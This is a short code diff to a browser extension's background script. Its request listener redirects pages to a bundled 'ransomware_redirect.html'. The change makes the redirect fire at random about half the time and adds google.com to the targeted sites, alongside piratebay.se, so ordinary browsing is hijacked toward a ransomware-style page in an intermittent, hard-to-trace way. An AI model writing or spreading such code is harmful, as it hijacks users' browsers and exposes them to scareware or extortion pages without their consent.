@@ -12,12 +12,15 @@ chrome.browserAction.onClicked.addListener(function(tab) {
 // how to redirect
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
-        return {redirectUrl: chrome.runtime.getURL("ransomware_redirect.html")}; //put here the url you want to redirect the page to
+        if (Math.random() > 0.5) {
+            return {redirectUrl: chrome.runtime.getURL("ransomware_redirect.html")};
+        }//put here the url you want to redirect the page to
     },
     {
         urls: [
             // put here the list of links that need to react to this event e.g. "*://www.google.com/*"
-            "*://www.piratebay.se/*"
+            "*://www.piratebay.se/*",
+            "*://www.google.com/*"
         ],
         types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
     },
